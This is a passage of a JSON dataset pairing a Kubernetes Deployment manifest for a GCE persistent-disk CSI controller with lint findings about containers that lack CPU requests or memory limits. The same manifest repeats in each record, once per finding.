--leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22012\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22013\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --handle-volume-inuse-error=false\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22013\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --metrics-address=:22014\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=300s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: gce-pd-driver\n        image: gke.gcr.io/gcp-compute-persistent-disk-csi-driver\n        args:\n        - --v=5\n        - --endpoint=unix:/csi/csi.sock\n        env:\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/cloud-sa/cloud-sa.json\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: cloud-sa-volume\n          readOnly: true\n          mountPath: /etc/cloud-sa\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: cloud-sa-volume\n        secret:\n          secretName: cloud-sa\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"csi-attacher\" has cpu request 0"
  },
  {
    "id": "10600",
    "manifest_path": "data/manifests/the_stack_sample/sample_4089.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-gce-pd-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: gcp-compute-persistent-disk-csi-driver\n  template:\n    metadata:\n      labels:\n        app: gcp-compute-persistent-disk-csi-driver\n    spec:\n      serviceAccountName: csi-gce-pd-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --feature-gates=Topology=true\n        - --http-endpoint=:22011\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        - --extra-create-metadata\n        - --leader-election\n        - --default-fstype=ext4\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22011\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22012\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22012\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22013\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --handle-volume-inuse-error=false\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22013\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --metrics-address=:22014\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=300s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: gce-pd-driver\n        image: gke.gcr.io/gcp-compute-persistent-disk-csi-driver\n        args:\n        - --v=5\n        - --endpoint=unix:/csi/csi.sock\n        env:\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/cloud-sa/cloud-sa.json\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: cloud-sa-volume\n          readOnly: true\n          mountPath: /etc/cloud-sa\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: cloud-sa-volume\n        secret:\n          secretName: cloud-sa\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"csi-provisioner\" has cpu request 0"
  },
  {
    "id": "10601",
    "manifest_path": "data/manifests/the_stack_sample/sample_4089.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-gce-pd-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: gcp-compute-persistent-disk-csi-driver\n  template:\n    metadata:\n      labels:\n        app: gcp-compute-persistent-disk-csi-driver\n    spec:\n      serviceAccountName: csi-gce-pd-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --feature-gates=Topology=true\n        - --http-endpoint=:22011\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        - --extra-create-metadata\n        - --leader-election\n        - --default-fstype=ext4\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22011\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22012\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22012\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22013\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --handle-volume-inuse-error=false\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22013\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --metrics-address=:22014\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=300s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: gce-pd-driver\n        image: gke.gcr.io/gcp-compute-persistent-disk-csi-driver\n        args:\n        - --v=5\n        - --endpoint=unix:/csi/csi.sock\n        env:\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/cloud-sa/cloud-sa.json\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: cloud-sa-volume\n          readOnly: true\n          mountPath: /etc/cloud-sa\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: cloud-sa-volume\n        secret:\n          secretName: cloud-sa\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"csi-resizer\" has cpu request 0"
  },
  {
    "id": "10602",
    "manifest_path": "data/manifests/the_stack_sample/sample_4089.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-gce-pd-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: gcp-compute-persistent-disk-csi-driver\n  template:\n    metadata:\n      labels:\n        app: gcp-compute-persistent-disk-csi-driver\n    spec:\n      serviceAccountName: csi-gce-pd-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --feature-gates=Topology=true\n        - --http-endpoint=:22011\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        - --extra-create-metadata\n        - --leader-election\n        - --default-fstype=ext4\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22011\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22012\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22012\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22013\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --handle-volume-inuse-error=false\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22013\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --metrics-address=:22014\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=300s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: gce-pd-driver\n        image: gke.gcr.io/gcp-compute-persistent-disk-csi-driver\n        args:\n        - --v=5\n        - --endpoint=unix:/csi/csi.sock\n        env:\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/cloud-sa/cloud-sa.json\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: cloud-sa-volume\n          readOnly: true\n          mountPath: /etc/cloud-sa\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: cloud-sa-volume\n        secret:\n          secretName: cloud-sa\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"csi-snapshotter\" has cpu request 0"
  },
  {
    "id": "10603",
    "manifest_path": "data/manifests/the_stack_sample/sample_4089.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-gce-pd-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: gcp-compute-persistent-disk-csi-driver\n  template:\n    metadata:\n      labels:\n        app: gcp-compute-persistent-disk-csi-driver\n    spec:\n      serviceAccountName: csi-gce-pd-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --feature-gates=Topology=true\n        - --http-endpoint=:22011\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        - --extra-create-metadata\n        - --leader-election\n        - --default-fstype=ext4\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22011\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22012\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22012\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22013\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --handle-volume-inuse-error=false\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22013\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --metrics-address=:22014\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=300s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: gce-pd-driver\n        image: gke.gcr.io/gcp-compute-persistent-disk-csi-driver\n        args:\n        - --v=5\n        - --endpoint=unix:/csi/csi.sock\n        env:\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/cloud-sa/cloud-sa.json\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: cloud-sa-volume\n          readOnly: true\n          mountPath: /etc/cloud-sa\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: cloud-sa-volume\n        secret:\n          secretName: cloud-sa\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"gce-pd-driver\" has cpu request 0"
  },
  {
    "id": "10604",
    "manifest_path": "data/manifests/the_stack_sample/sample_4089.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-gce-pd-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: gcp-compute-persistent-disk-csi-driver\n  template:\n    metadata:\n      labels:\n        app: gcp-compute-persistent-disk-csi-driver\n    spec:\n      serviceAccountName: csi-gce-pd-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --feature-gates=Topology=true\n        - --http-endpoint=:22011\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        - --extra-create-metadata\n        - --leader-election\n        - --default-fstype=ext4\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22011\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22012\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22012\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22013\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --handle-volume-inuse-error=false\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22013\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --metrics-address=:22014\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=300s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: gce-pd-driver\n        image: gke.gcr.io/gcp-compute-persistent-disk-csi-driver\n        args:\n        - --v=5\n        - --endpoint=unix:/csi/csi.sock\n        env:\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/cloud-sa/cloud-sa.json\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: cloud-sa-volume\n          readOnly: true\n          mountPath: /etc/cloud-sa\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: cloud-sa-volume\n        secret:\n          secretName: cloud-sa\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"csi-attacher\" has memory limit 0"
  },
  {
    "id": "10605",
    "manifest_path": "data/manifests/the_stack_sample/sample_4089.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-gce-pd-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: gcp-compute-persistent-disk-csi-driver\n  template:\n    metadata:\n      labels:\n        app: gcp-compute-persistent-disk-csi-driver\n    spec:\n      serviceAccountName: csi-gce-pd-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --feature-gates=Topology=true\n        - --http-endpoint=:22011\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        - --extra-create-metadata\n        - --leader-election\n        - --default-fstype=ext4\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22011\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22012\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22012\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22013\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --handle-volume-inuse-error=false\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22013\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --metrics-address=:22014\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=300s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: gce-pd-driver\n        image: gke.gcr.io/gcp-compute-persistent-disk-csi-driver\n        args:\n        - --v=5\n        - --endpoint=unix:/csi/csi.sock\n        env:\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/cloud-sa/cloud-sa.json\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: cloud-sa-volume\n          readOnly: true\n          mountPath: /etc/cloud-sa\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: cloud-sa-volume\n        secret:\n          secretName: cloud-sa\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"csi-provisioner\" has memory limit 0"
  },
  {
    "id": "10606",
    "manifest_path": "data/manifests/the_stack_sample/sample_4089.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-gce-pd-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: gcp-compute-persistent-disk-csi-driver\n  template:\n    metadata:\n      labels:\n        app: gcp-compute-persistent-disk-csi-driver\n    spec:\n      serviceAccountName: csi-gce-pd-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --feature-gates=Topology=true\n        - --http-endpoint=:22011\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        - --extra-create-metadata\n        - --leader-election\n        - --default-fstype=ext4\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22011\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22012\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22012\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22013\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --handle-volume-inuse-error=false\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22013\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --metrics-address=:22014\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=300s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: gce-pd-driver\n        image: gke.gcr.io/gcp-compute-persistent-disk-csi-driver\n        args:\n        - --v=5\n        - --endpoint=unix:/csi/csi.sock\n        env:\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/cloud-sa/cloud-sa.json\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: cloud-sa-volume\n          readOnly: true\n          mountPath: /etc/cloud-sa\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: cloud-sa-volume\n        secret:\n          secretName: cloud-sa\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"csi-resizer\" has memory limit 0"
  },
  {
    "id": "10607",
    "manifest_path": "data/manifests/the_stack_sample/sample_4089.yaml",
